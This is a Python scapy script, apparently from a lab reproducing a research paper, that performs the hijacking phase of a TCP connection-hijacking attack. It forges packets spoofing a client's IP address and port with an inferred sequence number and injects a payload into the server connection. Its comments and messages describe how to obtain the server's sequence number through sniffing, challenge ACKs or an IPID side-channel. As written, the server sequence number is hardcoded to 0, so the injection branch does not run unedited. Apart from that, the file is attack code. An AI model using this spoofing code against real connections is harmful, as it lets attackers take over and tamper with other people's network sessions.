#!/usr/bin/env python3
"""
Once SEQ is inferred, perform the hijacking
Attacker sends spoofed packets to take over the connection
"""

import sys
from scapy.all import IP, TCP, send, Raw
import time

def hijack(inferred_seq, sport):
    """
    Perform connection hijacking
    Attacker impersonates client and sends data to server
    """
    
    TARGET_IP = "20.0.0.20"
    TARGET_PORT = 8080
    
    # The inferred SEQ is what the server expects next from the client
    # We'll use it to send data the server will accept
    
    print("=" * 60)
    print("  HIJACKING PHASE")
    print("=" * 60)
    print(f"[*] Using inferred SEQ: {inferred_seq}")
    print(f"[*] Client port: {sport}")
    
    # For hijacking, we need both SEQ and ACK
    # SEQ = inferred_seq (what server expects)
    # ACK = we need to get this from server's SYN-ACK
    
    # In the paper, they infer ACK from:
    # 1. Captured server's SYN-ACK (from the connection)
    # 2. Challenge ACK responses
    # 3. IPID side-channel
    
    # For lab: we'll assume we got server's SEQ from previous handshake
    # Typical server ISN + 1 = server_seq
    
    # You can use the firewall's connection table or sniff SYN-ACK
    # For now, we'll try common values
    
    print("[*] Attempting hijacking with known SEQ...")
    
    # Scenario 1: We know server's SEQ from observing SYN-ACK
    # Extract from: nmap, tcpdump, or firewall logs
    
    server_seq = 0  # This should come from inference
    
    print("[!] To complete hijacking, you need:")
    print("    1. Inferred client SEQ (we have this)")
    print("    2. Server's current SEQ (infer from SYN-ACK or challenge ACK)")
    
    print("\n[*] In paper: Uses challenge ACK or IPID to get server SEQ")
    print("[*] For lab: Check firewall logs or tcpdump for server's SYN-ACK")
    
    # Example hijacking if we had server SEQ
    if server_seq > 0:
        print(f"\n[+] Hijacking with SEQ={inferred_seq}, ACK={server_seq}")
        
        payload = b"HIJACKED: Attacker was here!\n"
        
        pkt = (
            IP(src="10.0.0.10", dst=TARGET_IP)
            / TCP(
                sport=sport,
                dport=TARGET_PORT,
                flags="PA",
                seq=inferred_seq,
                ack=server_seq
            )
            / Raw(load=payload)
        )
        
        send(pkt, verbose=False)
        print(f"[+] Sent hijacking payload: {payload}")
    else:
        print("\n[-] Server SEQ unknown. Need to infer from:")
        print("    - Firewall connection table")
        print("    - tcpdump capture of SYN-ACK")
        print("    - Challenge ACK responses")
        print("    - IPID side-channel (advanced)")


def main():
    if len(sys.argv) < 3:
        print("Usage: sudo python3 attacker_hijack.py <inferred_seq> <client_port>")
        print("Example: sudo python3 attacker_hijack.py 3464045860 50210")
        sys.exit(1)
    
    inferred_seq = int(sys.argv[1])
    sport = int(sys.argv[2])
    
    hijack(inferred_seq, sport)


if __name__ == "__main__":
    main()
